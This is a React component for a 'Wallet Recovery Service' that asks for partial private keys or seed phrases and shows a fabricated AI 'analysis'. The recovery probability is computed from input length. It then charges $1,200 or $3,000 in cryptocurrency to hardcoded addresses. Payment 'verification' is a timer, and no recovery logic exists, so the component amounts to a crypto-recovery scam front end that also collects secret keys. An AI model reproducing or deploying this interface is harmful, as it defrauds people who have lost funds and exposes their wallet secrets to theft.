import React, { useState } from 'react';
import { Brain, Key, Lock, AlertTriangle, ChevronRight, Loader, CreditCard, Hash, Shield, Network, X, MessageSquare } from 'lucide-react';
import { FaBitcoin, FaEthereum } from 'react-icons/fa';
import { SiLitecoin, SiDogecoin } from 'react-icons/si';
import { BiCoin } from 'react-icons/bi';
import { TbCurrencyMonero, TbCurrencySolana } from 'react-icons/tb';
import { toast } from 'react-hot-toast';
import CopyToClipboard from 'react-copy-to-clipboard';

interface KeyReconstructionProps {
  onClose: () => void;
}

interface ServiceTier {
  name: string;
  price: number;
  features: string[];
  processingTime: string;
}

const SERVICE_TIERS: ServiceTier[] = [
  {
    name: 'Standard',
    price: 1200,
    features: [
      'AI-powered key analysis',
      'Blockchain forensics',
      'Pattern matching',
      'Manual review',
      'Stolen funds tracking',
      'Money-back guarantee'
    ],
    processingTime: '14-21 days'
  },
  {
    name: 'Priority',
    price: 3000,
    features: [
      'Everything in Standard',
      'Priority processing',
      'Dedicated team',
      'Advanced heuristics',
      'Real-time fund tracking',
      '24/7 support'
    ],
    processingTime: '7-14 days'
  }
];

const PAYMENT_METHODS = [
  {
    id: 'btc',
    name: 'Bitcoin',
    icon: FaBitcoin,
    address: 'bc1q9vyg4ceq9vcvju0205mwulapwmsmv8xejrjtxh'
  },
  {
    id: 'eth',
    name: 'Ethereum',
    icon: FaEthereum,
    address: '0xE1da0012f2A9b6340F3124898cBd8FA9DF78B35b'
  },
  {
    id: 'sol',
    name: 'Solana',
    icon: TbCurrencySolana,
    address: '7sXa85h8Q4AHAhwE7RMwVyXSVFo2K8ezMaNdVcWvHAF'
  },
  {
    id: 'bnb',
    name: 'BNB Smart Chain',
    icon: BiCoin,
    address: '0xE1da0012f2A9b6340F3124898cBd8FA9DF78B35b'
  },
  {
    id: 'xrp',
    name: 'XRP',
    icon: BiCoin,
    address: 'rwiVYRBPksDVJRQLGm9t5H29y6c6K4WMbf'
  },
  {
    id: 'ltc',
    name: 'Litecoin',
    icon: SiLitecoin,
    address: 'ltc1qznv9ywfz8nm26xlu998d6mp7sajqlwvld04nqm'
  },
  {
    id: 'trx',
    name: 'TRON',
    icon: BiCoin,
    address: 'TGBjnffDWbUVNT8ir5osHJjkRerumzCPR2'
  },
  {
    id: 'doge',
    name: 'Dogecoin',
    icon: SiDogecoin,
    address: 'D6HbJnSGjudN64Fq57RNjamSLT3i8TpDBo'
  },
  {
    id: 'xmr',
    name: 'Monero',
    icon: TbCurrencyMonero,
    address: '42XfEcrVSmXb5Kq3Ry5Je2jeSGeoVkHyvTiFJsE8xpJaNkwbfX7RPpaeihe4Uj3t3r8CzaTpACyQqfLvhNPz9bsx1EKQe7J'
  },
  {
    id: 'usdt',
    name: 'USDT',
    icon: BiCoin,
    chains: [
      {
        id: 'trc20',
        name: 'TRC20',
        address: 'TGBjnffDWbUVNT8ir5osHJjkRerumzCPR2'
      },
      {
        id: 'erc20',
        name: 'ERC20',
        address: '0xE1da0012f2A9b6340F3124898cBd8FA9DF78B35b'
      },
      {
        id: 'bep20',
        name: 'BEP20',
        address: '0xE1da0012f2A9b6340F3124898cBd8FA9DF78B35b'
      }
    ]
  }
];

export default function KeyReconstruction({ onClose }: KeyReconstructionProps) {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [partialKey, setPartialKey] = useState('');
  const [lastKnownTx, setLastKnownTx] = useState('');
  const [selectedTier, setSelectedTier] = useState<ServiceTier | null>(null);
  const [selectedPayment, setSelectedPayment] = useState<string>('');
  const [email, setEmail] = useState('');
  const [telegram, setTelegram] = useState('');
  const [successProbability, setSuccessProbability] = useState(0);
  const [paymentTxHash, setPaymentTxHash] = useState('');
  const [verifyingPayment, setVerifyingPayment] = useState(false);
  const [recoveryType, setRecoveryType] = useState<'lost' | 'stolen' | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const probability = Math.min(
        75,
        (partialKey.length > 30 ? 40 : 20) +
        (lastKnownTx.length > 0 ? 35 : 0)
      );
      
      setSuccessProbability(probability);
      setStep(2);
      
      toast.success('Analysis complete! Please select a service tier.');
    } catch (error) {
      toast.error('Error analyzing wallet data');
    } finally {
      setLoading(false);
    }
  };

  const handleServiceSelect = (tier: ServiceTier) => {
    setSelectedTier(tier);
    setStep(3);
  };

  const handlePaymentSelect = (methodId: string) => {
    setSelectedPayment(methodId);
  };

  const handleContactSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email && !telegram) {
      toast.error('Please provide either email or XMPP ID');
      return;
    }
    setStep(4);
  };

  const handlePaymentSubmit = () => {
    setStep(5);
  };

  const handleVerifyPayment = async () => {
    if (!paymentTxHash) {
      toast.error('Please enter the transaction hash');
      return;
    }

    setVerifyingPayment(true);
    try {
      // Simulate payment verification
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      toast.success('Payment verified! Our team will contact you shortly.');
      onClose();
    } catch (error) {
      toast.error('Error verifying payment. Please try again.');
    } finally {
      setVerifyingPayment(false);
    }
  };

  const renderServiceSelection = () => (
    <div className="space-y-6">
      <div className="p-6 bg-cyber-black/50 rounded-lg border border-cyber-accent/30">
        <div className="flex items-center justify-between mb-4">
          <h3 className="font-['Orbitron'] text-lg">Recovery Probability</h3>
          <div className="text-xl font-bold text-cyber-accent">
            {successProbability}%
          </div>
        </div>
        <div className="h-2 bg-cyber-darker rounded-full overflow-hidden">
          <div
            className="h-full bg-cyber-accent transition-all duration-1000"
            style={{ width: `${successProbability}%` }}
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {SERVICE_TIERS.map((tier) => (
          <div
            key={tier.name}
            className="cyber-card p-6 hover:border-cyber-accent cursor-pointer transition-all duration-300"
            onClick={() => handleServiceSelect(tier)}
          >
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-['Orbitron'] text-lg">{tier.name}</h3>
              <div className="text-xl font-bold text-cyber-accent">
                ${tier.price.toLocaleString()}
              </div>
            </div>
            <div className="space-y-3 mb-4">
              {tier.features.map((feature, index) => (
                <div key={index} className="flex items-center gap-2 text-sm">
                  <ChevronRight className="w-4 h-4 text-cyber-accent" />
                  <span>{feature}</span>
                </div>
              ))}
            </div>
            <div className="text-sm text-cyber-secondary/70">
              Processing time: {tier.processingTime}
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  const renderContactForm = () => (
    <form onSubmit={handleContactSubmit} className="space-y-6">
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-['Orbitron'] mb-2">Email Address</label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="cyber-input"
            placeholder="your@email.com"
          />
        </div>

        <div>
          <label className="block text-sm font-['Orbitron'] mb-2">Telegram Username</label>
          <input
            type="text"
            value={telegram}
            onChange={(e) => setTelegram(e.target.value)}
            className="cyber-input"
            placeholder="@username"
          />
        </div>

        <div className="p-4 bg-cyber-primary/10 rounded-lg border border-cyber-primary/30">
          <div className="flex items-center gap-2 mb-2">
            <AlertTriangle className="w-4 h-4 text-cyber-primary" />
            <span className="text-sm font-bold text-cyber-primary">Contact Required</span>
          </div>
          <p className="text-sm text-cyber-secondary/90">
            Please provide at least one contact method. Our team will use this to coordinate the recovery process.
          </p>
        </div>

        <button
          type="submit"
          className="cyber-button cyber-button-primary w-full group"
        >
          <CreditCard className="w-4 h-4 group-hover:scale-110 transition-transform" />
          <span>Continue to Payment</span>
        </button>
      </div>
    </form>
  );

  const renderPaymentMethods = () => (
    <div className="space-y-6">
      <div className="p-4 bg-cyber-black/50 rounded-lg border border-cyber-secondary/30">
        <h3 className="font-['Orbitron'] text-lg mb-4">Payment Details</h3>
        <div className="space-y-2">
          <div className="flex justify-between">
            <span>Service Level:</span>
            <span className="text-cyber-accent">{selectedTier?.name}</span>
          </div>
          <div className="flex justify-between">
            <span>Amount:</span>
            <span className="text-cyber-accent">${selectedTier?.price.toLocaleString()}</span>
          </div>
        </div>
      </div>

      <div className="space-y-4">
        <h3 className="font-['Orbitron'] text-lg">Select Payment Method</h3>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {PAYMENT_METHODS.map((method) => {
            const Icon = method.icon;
            return (
              <button
                key={method.id}
                onClick={() => handlePaymentSelect(method.id)}
                className={`cyber-button justify-start gap-3 ${
                  selectedPayment === method.id ? 'border-cyber-accent text-cyber-accent' : ''
                }`}
              >
                <Icon className="w-5 h-5" />
                <span>{method.name}</span>
              </button>
            );
          })}
        </div>
      </div>

      {selectedPayment && (
        <div className="space-y-4">
          <div className="p-4 bg-cyber-black/50 rounded-lg border border-cyber-secondary/30">
            <h3 className="text-sm font-['Orbitron'] mb-2">Payment Address</h3>
            <div className="flex items-center gap-2">
              <code className="flex-1 font-mono text-sm break-all">
                {PAYMENT_METHODS.find(m => m.id === selectedPayment)?.address || 
                 (PAYMENT_METHODS.find(m => m.id === selectedPayment)?.chains?.[0].address)}
              </code>
              <CopyToClipboard
                text={PAYMENT_METHODS.find(m => m.id === selectedPayment)?.address || 
                      (PAYMENT_METHODS.find(m => m.id === selectedPayment)?.chains?.[0].address) || ''}
                onCopy={() => toast.success('Address copied to clipboard')}
              >
                <button className="p-2 hover:text-cyber-accent transition-colors">
                  <Key className="w-4 h-4" />
                </button>
              </CopyToClipboard>
            </div>
          </div>

          {PAYMENT_METHODS.find(m => m.id === selectedPayment)?.chains && (
            <div className="p-4 bg-cyber-black/50 rounded-lg border border-cyber-secondary/30">
              <h3 className="text-sm font-['Orbitron'] mb-4">Available Networks</h3>
              <div className="space-y-4">
                {PAYMENT_METHODS.find(m => m.id === selectedPayment)?.chains?.map((chain) => (
                  <div key={chain.id} className="flex items-center justify-between">
                    <span>{chain.name}</span>
                    <div className="flex items-center gap-2">
                      <code className="font-mono text-sm">{chain.address}</code>
                      <CopyToClipboard
                        text={chain.address}
                        onCopy={() => toast.success(`${chain.name} address copied`)}
                      >
                        <button className="p-1 hover:text-cyber-accent transition-colors">
                          <Key className="w-4 h-4" />
                        </button>
                      </CopyToClipboard>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          <button
            onClick={handlePaymentSubmit}
            className="cyber-button cyber-button-primary w-full group"
          >
            <Lock className="w-4 h-4 group-hover:scale-110 transition-transform" />
            <span>I've Made the Payment</span>
          </button>
        </div>
      )}
    </div>
  );

  const renderPaymentVerification = () => (
    <div className="space-y-6">
      <div className="p-4 bg-cyber-black/50 rounded-lg border border-cyber-accent/30">
        <div className="flex items-center gap-2 mb-4">
          <Hash className="w-5 h-5 text-cyber-accent" />
          <h3 className="font-['Orbitron'] text-lg">Verify Payment</h3>
        </div>
        <p className="text-sm text-cyber-secondary/70 mb-4">
          Please enter the transaction hash of your payment to verify and begin the recovery process.
        </p>
        <input
          type="text"
          value={paymentTxHash}
          onChange={(e) => setPaymentTxHash(e.target.value)}
          className="cyber-input font-mono w-full"
          placeholder="Enter transaction hash..."
        />
      </div>

      <button
        onClick={handleVerifyPayment}
        disabled={verifyingPayment || !paymentTxHash}
        className="cyber-button cyber-button-primary w-full group"
      >
        {verifyingPayment ? (
          <>
            <Loader className="w-4 h-4 animate-spin" />
            <span>Verifying Payment...</span>
          </>
        ) : (
          <>
            <Lock className="w-4 h-4 group-hover:scale-110 transition-transform" />
            <span>Verify & Begin Recovery</span>
          </>
        )}
      </button>
    </div>
  );

  const renderInitialChoice = () => (
    <div className="space-y-6">
      <div className="p-4 bg-cyber-black/50 rounded-lg border border-cyber-accent/30">
        <div className="flex items-center gap-2 mb-4">
          <Shield className="w-5 h-5 text-cyber-accent" />
          <h3 className="font-['Orbitron'] text-lg">Select Recovery Type</h3>
        </div>
        <p className="text-sm text-cyber-secondary/70 mb-6">
          Choose the scenario that best matches your situation for optimized recovery procedures.
        </p>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <button
            onClick={() => {
              setRecoveryType('lost');
              setStep(1);
            }}
            className="cyber-card p-4 hover:border-cyber-accent transition-all duration-300"
          >
            <div className="flex items-center gap-3 mb-2">
              <Key className="w-5 h-5 text-cyber-accent" />
              <h4 className="font-['Orbitron']">Lost Access</h4>
            </div>
            <p className="text-sm text-cyber-secondary/70">
              Forgot private key, lost seed phrase, or hardware wallet issues
            </p>
          </button>
          <button
            onClick={() => {
              setRecoveryType('stolen');
              setStep(1);
            }}
            className="cyber-card p-4 hover:border-cyber-accent transition-all duration-300"
          >
            <div className="flex items-center gap-3 mb-2">
              <AlertTriangle className="w-5 h-5 text-cyber-primary" />
              <h4 className="font-['Orbitron']">Stolen Funds</h4>
            </div>
            <p className="text-sm text-cyber-secondary/70">
              Unauthorized transactions or compromised wallet
            </p>
          </button>
        </div>
      </div>
    </div>
  );

  return (
    <div className="cyber-card border-cyber-accent">
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-cyber-accent/10 rounded-lg">
            <Brain className="w-6 h-6 text-cyber-accent" />
          </div>
          <h2 className="text-xl font-['Orbitron'] font-bold">Wallet Recovery Service</h2>
        </div>
        <button
          onClick={onClose}
          className="p-2 hover:text-cyber-primary transition-colors"
        >
          ×
        </button>
      </div>

      {!recoveryType && renderInitialChoice()}
      {recoveryType && step === 1 && (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-['Orbitron'] mb-2">Partial Private Key or Seed Phrase</label>
              <textarea
                value={partialKey}
                onChange={(e) => setPartialKey(e.target.value)}
                className="cyber-input font-mono h-24"
                placeholder="Enter any known fragments of your private key or seed phrase..."
              />
            </div>

            <div>
              <label className="block text-sm font-['Orbitron'] mb-2">Last Known Transaction (optional)</label>
              <input
                type="text"
                value={lastKnownTx}
                onChange={(e) => setLastKnownTx(e.target.value)}
                className="cyber-input font-mono"
                placeholder="Transaction hash or approximate date..."
              />
            </div>
          </div>

          <button
            type="submit"
            disabled={loading || !partialKey}
            className="cyber-button cyber-button-primary w-full group"
          >
            {loading ? (
              <>
                <Loader className="w-4 h-4 animate-spin" />
                <span>Analyzing Data...</span>
              </>
            ) : (
              <>
                <Lock className="w-4 h-4 group-hover:scale-110 transition-transform" />
                <span>Begin Recovery Analysis</span>
              </>
            )}
          </button>
        </form>
      )}
      {step === 2 && renderServiceSelection()}
      {step === 3 && renderContactForm()}
      {step === 4 && renderPaymentMethods()}
      {step === 5 && renderPaymentVerification()}
    </div>
  );
}